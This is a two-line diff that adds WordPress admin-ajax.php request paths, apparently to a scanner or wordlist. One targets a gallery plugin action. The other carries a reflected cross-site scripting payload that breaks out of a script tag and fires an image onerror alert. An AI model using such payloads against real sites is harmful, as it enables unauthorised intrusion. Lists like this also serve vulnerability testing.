@@ -1,0 +1,2 @@
+/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1
+/wp-admin/admin-ajax.php?action=window&callback=</script><img/src/onerror=alert(document.domain)>
